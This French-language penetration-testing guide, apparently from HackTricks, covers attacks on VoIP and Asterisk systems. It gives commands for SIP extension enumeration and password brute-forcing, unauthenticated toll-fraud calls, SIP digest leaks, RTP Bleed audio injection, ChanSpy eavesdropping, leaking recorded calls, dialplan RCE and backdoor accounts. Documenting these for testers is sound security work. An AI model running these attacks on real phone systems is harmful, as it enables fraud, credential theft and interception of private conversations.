# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}


## Informations de base sur VoIP

Pour commencer à apprendre comment fonctionne VoIP, consultez :

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Messages de base
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Codes de Réponse

**1xx—Réponses Provisoires**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Réponses réussies**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Réponses de redirection**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Réponses d'échec du client**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Réponses d'échec du serveur**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Réponses d'échec globales**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Énumération VoIP

### Numéros de téléphone

L'une des premières étapes qu'une équipe rouge pourrait faire est de rechercher des numéros de téléphone disponibles pour contacter l'entreprise en utilisant des outils OSINT, des recherches Google ou en scrappant les pages web.

Une fois que vous avez les numéros de téléphone, vous pourriez utiliser des services en ligne pour identifier l'opérateur :

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Savoir si l'opérateur fournit des services VoIP pourrait vous permettre d'identifier si l'entreprise utilise VoIP... De plus, il est possible que l'entreprise n'ait pas engagé de services VoIP mais utilise des cartes PSTN pour connecter son propre PBX VoIP au réseau de téléphonie traditionnel.

Des éléments tels que des réponses automatisées de musique indiquent généralement que VoIP est utilisé.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informations OSINT

Toute autre énumération OSINT qui aide à identifier le logiciel VoIP utilisé sera utile pour une équipe rouge.

### Énumération du réseau

- **`nmap`** est capable de scanner les services UDP, mais en raison du nombre de services UDP scannés, il est très lent et peut ne pas être très précis avec ce type de services.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localisera les services SIP dans le réseau indiqué.
- `svmap` est **facile à bloquer** car il utilise l'User-Agent `friendly-scanner`, mais vous pourriez modifier le code de `/usr/share/sipvicious/sipvicious` et le changer.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Le scan SIPPTS est un scanner très rapide pour les services SIP sur UDP, TCP ou TLS. Il utilise le multithreading et peut scanner de larges plages de réseaux. Il permet d'indiquer facilement une plage de ports, de scanner à la fois TCP et UDP, d'utiliser une autre méthode (par défaut, il utilisera OPTIONS) et de spécifier un User-Agent différent (et plus).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Énumération Réseau Supplémentaire

Le PBX pourrait également exposer d'autres services réseau tels que :

- **69/UDP (TFTP)** : Mises à jour du firmware
- **80 (HTTP) / 443 (HTTPS)** : Pour gérer l'appareil depuis le web
- **389 (LDAP)** : Alternative pour stocker les informations des utilisateurs
- **3306 (MySQL)** : Base de données MySQL
- **5038 (Manager)** : Permet d'utiliser Asterisk depuis d'autres plateformes
- **5222 (XMPP)** : Messages utilisant Jabber
- **5432 (PostgreSQL)** : Base de données PostgreSQL
- Et d'autres...

### Énumération des Méthodes

Il est possible de trouver **quelles méthodes sont disponibles** à utiliser dans le PBX en utilisant `SIPPTS enumerate` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analyser les réponses du serveur

Il est très important d'analyser les en-têtes qu'un serveur nous renvoie, en fonction du type de message et des en-têtes que nous envoyons. Avec `SIPPTS send` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages personnalisés, en manipulant tous les en-têtes, et analyser la réponse.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Il est également possible d'obtenir des données si le serveur utilise des websockets. Avec `SIPPTS wssend` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages WS personnalisés.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Énumération des extensions

Les extensions dans un système PBX (Private Branch Exchange) font référence aux **identifiants internes uniques attribués à chaque** ligne téléphonique, appareil ou utilisateur au sein d'une organisation ou d'une entreprise. Les extensions permettent de **diriger les appels au sein de l'organisation de manière efficace**, sans avoir besoin de numéros de téléphone externes individuels pour chaque utilisateur ou appareil.

- **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` est un scanner de lignes d'extension SIP PBX gratuit. En concept, il fonctionne de manière similaire aux wardialers traditionnels en **devinant une plage d'extensions ou une liste donnée d'extensions**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifie les extensions sur un serveur SIP. Sipexten peut vérifier de grands réseaux et plages de ports.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit** : Vous pouvez également énumérer les extensions/noms d'utilisateur avec metasploit :
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** est un énumérateur de **brute-force de nom d'utilisateur** pour le protocole Inter Asterisk Exchange. enumIAX peut fonctionner en deux modes distincts : Devinette séquentielle de nom d'utilisateur ou Attaque par dictionnaire.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attaques VoIP

### Brute-Force de Mot de Passe - en ligne

Ayant découvert le **PBX** et quelques **extensions/noms d'utilisateur**, une équipe rouge pourrait essayer de **s'authentifier via la méthode `REGISTER`** à une extension en utilisant un dictionnaire de mots de passe courants pour forcer l'authentification.

> [!CAUTION]
> Notez qu'un **nom d'utilisateur** peut être le même que l'extension, mais cette pratique peut varier en fonction du système PBX, de sa configuration et des préférences de l'organisation...
>
> Si le nom d'utilisateur n'est pas le même que l'extension, vous devrez **découvrir le nom d'utilisateur à forcer**.

- **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack vous permet de craquer le mot de passe pour un nom d'utilisateur/extension spécifique sur un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack est un cracker de mots de passe à distance pour les services SIP. Rcrack peut tester des mots de passe pour plusieurs utilisateurs sur différentes IP et plages de ports.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### Sniffing VoIP

Si vous trouvez du matériel VoIP à l'intérieur d'un **réseau Wifi ouvert**, vous pourriez **sniffer toutes les informations**. De plus, si vous êtes à l'intérieur d'un réseau plus fermé (connecté via Ethernet ou Wifi protégé), vous pourriez effectuer des **attaques MitM telles que** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre le **PBX et la passerelle** afin de sniffer les informations.

Parmi les informations réseau, vous pourriez trouver des **identifiants web** pour gérer le matériel, des **extensions** d'utilisateur, des **noms d'utilisateur**, des adresses **IP**, même des **mots de passe hachés** et des **paquets RTP** que vous pourriez reproduire pour **entendre la conversation**, et plus encore.

Pour obtenir ces informations, vous pourriez utiliser des outils tels que Wireshark, tcpdump... mais un **outil spécialement créé pour sniffer les conversations VoIP est** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Notez que si **TLS est utilisé dans la communication SIP**, vous ne pourrez pas voir la communication SIP en clair.\
> Il en sera de même si **SRTP** et **ZRTP** sont utilisés, les **paquets RTP ne seront pas en texte clair**.

#### Identifiants SIP (Brute-Force de mot de passe - hors ligne)

[Consultez cet exemple pour mieux comprendre une **communication SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) pour apprendre comment les **identifiants sont envoyés**.

- **`sipdump`** & **`sipcrack`,** partie de **sipcrack** (`apt-get install sipcrack`): Ces outils peuvent **extraire** d'un **pcap** les **authentifications digestes** au sein du protocole SIP et les **bruteforcer**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Le dump SIPPTS peut extraire des authentifications digest à partir d'un fichier pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack est un outil pour craquer les authentifications digest obtenues avec le dump SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrait des données du protocole SIP à partir d'un fichier PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Codes DTMF

**Non seulement les identifiants SIP** peuvent être trouvés dans le trafic réseau, il est également possible de trouver des codes DTMF qui sont utilisés par exemple pour accéder à la **messagerie vocale**.\
Il est possible d'envoyer ces codes dans des **messages SIP INFO**, dans **l'audio** ou à l'intérieur des **paquets RTP**. Si les codes sont à l'intérieur des paquets RTP, vous pourriez couper cette partie de la conversation et utiliser l'outil multimo pour les extraire :
```bash
multimon -a DTMF -t wac pin.wav
```
### Appels gratuits / Mauvaises configurations des connexions Asterisk

Dans Asterisk, il est possible de permettre une connexion **d'une adresse IP spécifique** ou de **n'importe quelle adresse IP** :
```
host=10.10.10.10
host=dynamic
```
Si une adresse IP est spécifiée, l'hôte **n'aura pas besoin d'envoyer des requêtes REGISTER** de temps en temps (dans le paquet REGISTER, le temps de vie est envoyé, généralement 30 minutes, ce qui signifie que dans d'autres scénarios, le téléphone devra s'enregistrer toutes les 30 minutes). Cependant, il devra avoir des ports ouverts permettant des connexions du serveur VoIP pour recevoir des appels.

Pour définir les utilisateurs, ils peuvent être définis comme :

- **`type=user`** : L'utilisateur ne peut recevoir des appels qu'en tant qu'utilisateur.
- **`type=friend`** : Il est possible de passer des appels en tant que pair et de les recevoir en tant qu'utilisateur (utilisé avec des extensions).
- **`type=peer`** : Il est possible d'envoyer et de recevoir des appels en tant que pair (SIP-trunks).

Il est également possible d'établir une confiance avec la variable insecure :

- **`insecure=port`** : Permet des connexions entre pairs validées par IP.
- **`insecure=invite`** : Ne nécessite pas d'authentification pour les messages INVITE.
- **`insecure=port,invite`** : Les deux.

> [!WARNING]
> Lorsque **`type=friend`** est utilisé, la **valeur** de la variable **host** **ne sera pas utilisée**, donc si un admin **malconfigure un SIP-trunk** en utilisant cette valeur, **n'importe qui pourra s'y connecter**.
>
> Par exemple, cette configuration serait vulnérable :\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Appels gratuits / Mauvaises configurations de contexte Asterisk

Dans Asterisk, un **contexte** est un conteneur ou une section nommée dans le plan de numérotation qui **regroupe des extensions, des actions et des règles connexes**. Le plan de numérotation est le composant central d'un système Asterisk, car il définit **comment les appels entrants et sortants sont gérés et routés**. Les contextes sont utilisés pour organiser le plan de numérotation, gérer le contrôle d'accès et fournir une séparation entre différentes parties du système.

Chaque contexte est défini dans le fichier de configuration, généralement dans le fichier **`extensions.conf`**. Les contextes sont notés par des crochets, avec le nom du contexte inclus à l'intérieur. Par exemple :
```bash
csharpCopy code[my_context]
```
Dans le contexte, vous définissez des extensions (modèles de numéros composés) et les associez à une série d'actions ou d'applications. Ces actions déterminent comment l'appel est traité. Par exemple :
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Cet exemple démontre un contexte simple appelé "my_context" avec une extension "100". Lorsque quelqu'un compose le 100, l'appel sera répondu, un message de bienvenue sera joué, puis l'appel sera terminé.

Ceci est **un autre contexte** qui permet de **composer n'importe quel autre numéro** :
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si l'administrateur définit le **contexte par défaut** comme :
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Quiconque pourra utiliser le **serveur pour appeler n'importe quel autre numéro** (et l'administrateur du serveur paiera pour l'appel).

> [!CAUTION]
> De plus, par défaut, le fichier **`sip.conf`** contient **`allowguest=true`**, donc **tout** attaquant sans **authentification** pourra appeler n'importe quel autre numéro.

- **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite vérifie si un **serveur PBX nous permet de passer des appels sans authentification**. Si le serveur SIP a une configuration incorrecte, il nous permettra de passer des appels vers des numéros externes. Il peut également nous permettre de transférer l'appel vers un deuxième numéro externe.

Par exemple, si votre serveur Asterisk a une mauvaise configuration de contexte, vous pouvez accepter une demande INVITE sans autorisation. Dans ce cas, un attaquant peut passer des appels sans connaître aucun identifiant/mot de passe.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Appels gratuits / IVRS mal configurés

IVRS signifie **Système de Réponse Vocale Interactive**, une technologie de téléphonie qui permet aux utilisateurs d'interagir avec un système informatisé par le biais d'entrées vocales ou de tonalités. IVRS est utilisé pour construire des systèmes de **gestion d'appels automatisés** qui offrent une gamme de fonctionnalités, telles que la fourniture d'informations, le routage des appels et la capture des entrées des utilisateurs.

IVRS dans les systèmes VoIP se compose généralement de :

1. **Invitations vocales** : Messages audio préenregistrés qui guident les utilisateurs à travers les options et instructions du menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) signalisation : Entrées de tonalité générées en appuyant sur des touches du téléphone, qui sont utilisées pour naviguer dans les menus IVR et fournir des entrées.
3. **Routage des appels** : Diriger les appels vers la destination appropriée, comme des départements spécifiques, des agents ou des postes en fonction des entrées des utilisateurs.
4. **Capture des entrées utilisateur** : Collecter des informations auprès des appelants, telles que des numéros de compte, des identifiants de cas ou toute autre donnée pertinente.
5. **Intégration avec des systèmes externes** : Connecter le système IVR à des bases de données ou d'autres systèmes logiciels pour accéder ou mettre à jour des informations, effectuer des actions ou déclencher des événements.

Dans un système VoIP Asterisk, vous pouvez créer un IVR en utilisant le plan de numérotation (**`extensions.conf`** fichier) et diverses applications telles que `Background()`, `Playback()`, `Read()`, et plus encore. Ces applications vous aident à jouer des invitations vocales, à capturer les entrées des utilisateurs et à contrôler le flux des appels.

#### Exemple de configuration vulnérable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
L'exemple précédent est un exemple où l'utilisateur est invité à **appuyer sur 1 pour appeler** un département, **2 pour appeler** un autre, ou **le numéro complet** s'il le connaît.\
La vulnérabilité est le fait que la **longueur de l'extension indiquée n'est pas vérifiée, donc un utilisateur pourrait entrer le délai d'attente de 5 secondes d'un numéro complet et il sera appelé.**

### Injection d'extension

En utilisant une extension telle que :
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Où **`${EXTEN}`** est l'**extension** qui sera appelée, lorsque **l'ext 101 est introduite**, voici ce qui se passerait :
```scss
exten => 101,1,Dial(SIP/101)
```
Cependant, si **`${EXTEN}`** permet d'introduire **plus que des chiffres** (comme dans les anciennes versions d'Asterisk), un attaquant pourrait introduire **`101&SIP123123123`** pour appeler le numéro de téléphone 123123123. Et ce serait le résultat :
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Par conséquent, un appel à l'extension **`101`** et **`123123123`** sera envoyé et seul le premier à recevoir l'appel sera établi... mais si un attaquant utilise une **extension qui contourne toute correspondance** qui est effectuée mais n'existe pas, il pourrait **injecter un appel uniquement au numéro souhaité**.

## Vulnérabilité SIPDigestLeak

La vulnérabilité SIP Digest Leak affecte un grand nombre de téléphones SIP, y compris les téléphones IP matériels et logiciels ainsi que les adaptateurs téléphoniques (VoIP vers analogique). La vulnérabilité permet **la fuite de la réponse d'authentification Digest**, qui est calculée à partir du mot de passe. Une **attaque par mot de passe hors ligne est alors possible** et peut récupérer la plupart des mots de passe basés sur la réponse au défi.

**[Scénario de vulnérabilité d'ici**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un téléphone IP (victime) écoute sur n'importe quel port (par exemple : 5060), acceptant les appels téléphoniques
2. L'attaquant envoie un INVITE au téléphone IP
3. Le téléphone de la victime commence à sonner et quelqu'un décroche et raccroche (car personne ne répond au téléphone à l'autre bout)
4. Lorsque le téléphone est raccroché, le **téléphone de la victime envoie un BYE à l'attaquant**
5. L'**attaquant émet une réponse 407** qui **demande une authentification** et émet un défi d'authentification
6. Le **téléphone de la victime fournit une réponse au défi d'authentification** dans un second BYE
7. L'**attaquant peut alors lancer une attaque par force brute** sur la réponse au défi sur sa machine locale (ou réseau distribué, etc.) et deviner le mot de passe

- **Fuite SIPPTS** de [**sippts**](https://github.com/Pepelux/sippts)**:** La fuite SIPPTS exploite la vulnérabilité SIP Digest Leak qui affecte un grand nombre de téléphones SIP. La sortie peut être enregistrée au format SipCrack pour être brute forcée en utilisant SIPPTS dcrack ou l'outil SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permet à un **utilisateur web** (qui par exemple pourrait être intéressé par un produit) de **fournir** son **numéro de téléphone** pour être appelé. Ensuite, un commercial sera appelé, et quand il **décroche le téléphone**, l'utilisateur sera **appelé et connecté avec l'agent**.

Un profil Asterisk courant pour cela est :
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- Le profil précédent permet à **N'IMPORTE QUEL adresse IP de se connecter** (si le mot de passe est connu).
- Pour **organiser un appel**, comme spécifié précédemment, **aucune permission de lecture n'est nécessaire** et **seulement** **l'origine** en **écriture** est requise.

Avec ces permissions, n'importe quelle IP connaissant le mot de passe pourrait se connecter et extraire trop d'infos, comme :
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Plus d'informations ou d'actions peuvent être demandées.**

### **Écoute clandestine**

Dans Asterisk, il est possible d'utiliser la commande **`ChanSpy`** en indiquant les **extensions à surveiller** (ou toutes) pour entendre les conversations qui se déroulent. Cette commande doit être assignée à une extension.

Par exemple, **`exten => 333,1,ChanSpy('all',qb)`** indique que si vous **appelez** l'**extension 333**, elle **surveillera** **`toutes`** les extensions, **commencera à écouter** chaque fois qu'une nouvelle conversation commence (**`b`**) en mode silencieux (**`q`**) car nous ne voulons pas interagir. Vous pouvez passer d'une conversation à une autre en appuyant sur **`*`**, ou en marquant le numéro de l'extension.

Il est également possible d'utiliser **`ExtenSpy`** pour surveiller une seule extension.

Au lieu d'écouter les conversations, il est possible de **les enregistrer dans des fichiers** en utilisant une extension telle que :
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
Les appels seront enregistrés dans **`/tmp`**.

Vous pourriez même faire en sorte qu'Asterisk **exécute un script qui va fuir l'appel** lorsqu'il est fermé.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnérabilité RTCPBleed

**RTCPBleed** est un problème de sécurité majeur affectant les serveurs VoIP basés sur Asterisk (publié en 2017). La vulnérabilité permet à **RTP (Real Time Protocol) traffic**, qui transporte les conversations VoIP, d'être **intercepté et redirigé par quiconque sur Internet**. Cela se produit parce que le trafic RTP contourne l'authentification lors de la navigation à travers les pare-feu NAT (Network Address Translation).

Les proxys RTP essaient de résoudre les **limitations NAT** affectant les systèmes RTC en proxyant les flux RTP entre deux parties ou plus. Lorsque le NAT est en place, le logiciel de proxy RTP ne peut souvent pas se fier aux informations IP et port RTP récupérées via le signalement (par exemple, SIP). Par conséquent, un certain nombre de proxys RTP ont mis en œuvre un mécanisme où un tel **tuplet IP et port est appris automatiquement**. Cela se fait souvent en inspectant le trafic RTP entrant et en marquant l'IP et le port source pour tout trafic RTP entrant comme ceux qui devraient être répondus. Ce mécanisme, qui peut être appelé "mode d'apprentissage", **ne fait pas usage d'aucun type d'authentification**. Par conséquent, **les attaquants** peuvent **envoyer du trafic RTP au proxy RTP** et recevoir le trafic RTP proxifié destiné à l'appelant ou au destinataire d'un flux RTP en cours. Nous appelons cette vulnérabilité RTP Bleed car elle permet aux attaquants de recevoir des flux médias RTP destinés à être envoyés à des utilisateurs légitimes.

Un autre comportement intéressant des proxys RTP et des piles RTP est que parfois, **même s'ils ne sont pas vulnérables à RTP Bleed**, ils **acceptent, transmettent et/ou traitent des paquets RTP de n'importe quelle source**. Par conséquent, les attaquants peuvent envoyer des paquets RTP qui peuvent leur permettre d'injecter leurs médias au lieu de ceux légitimes. Nous appelons cette attaque injection RTP car elle permet l'injection de paquets RTP illégitimes dans des flux RTP existants. Cette vulnérabilité peut être trouvée à la fois dans les proxys RTP et les points de terminaison.

Asterisk et FreePBX ont traditionnellement utilisé le **paramètre `NAT=yes`**, qui permet au trafic RTP de contourner l'authentification, ce qui peut entraîner l'absence de son ou un son unidirectionnel lors des appels.

Pour plus d'infos, consultez [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed détecte la vulnérabilité RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed détecte la vulnérabilité RTP Bleed en envoyant des flux RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood exploite la vulnérabilité RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject exploite la vulnérabilité RTP Bleed en injectant un fichier audio (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Dans Asterisk, si vous parvenez à **ajouter des règles d'extension et à les recharger** (par exemple en compromettant un serveur de gestion web vulnérable), il est possible d'obtenir un RCE en utilisant la commande **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Il existe une commande appelée **`Shell`** qui pourrait être utilisée **au lieu de `System`** pour exécuter des commandes système si nécessaire.

> [!WARNING]
> Si le serveur **interdit l'utilisation de certains caractères** dans la commande **`System`** (comme dans Elastix), vérifiez si le serveur web permet de **créer des fichiers d'une manière ou d'une autre à l'intérieur du système** (comme dans Elastix ou trixbox), et utilisez-le pour **créer un script de porte dérobée** puis utilisez **`System`** pour **exécuter** ce **script**.

#### Fichiers locaux intéressants et permissions

- **`sip.conf`** -> Contient le mot de passe des utilisateurs SIP.
- Si le **serveur Asterisk fonctionne en tant que root**, vous pourriez compromettre root.
- L'**utilisateur root mysql** pourrait **ne pas avoir de mot de passe**.
- cela pourrait être utilisé pour créer un nouvel utilisateur mysql comme porte dérobée.
- **`FreePBX`**
- **`amportal.conf`** -> Contient le mot de passe de l'administrateur du panneau web (FreePBX).
- **`FreePBX.conf`** -> Contient le mot de passe de l'utilisateur FreePBXuser utilisé pour accéder à la base de données.
- cela pourrait être utilisé pour créer un nouvel utilisateur mysql comme porte dérobée.
- **`Elastix`**
- **`Elastix.conf`** -> Contient plusieurs mots de passe en texte clair comme le mot de passe root mysql, le mot de passe IMAPd, le mot de passe de l'administrateur web.
- **Plusieurs dossiers** appartiendront à l'utilisateur asterisk compromis (s'il ne fonctionne pas en tant que root). Cet utilisateur peut lire les fichiers précédents et contrôle également la configuration, il pourrait donc faire en sorte qu'Asterisk charge d'autres binaires avec porte dérobée lorsqu'ils sont exécutés.

### Injection RTP

Il est possible d'insérer un **`.wav`** dans les conversations en utilisant des outils tels que **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) et **`rtpmixsound`** (`sudo apt install rtpmixsound`).

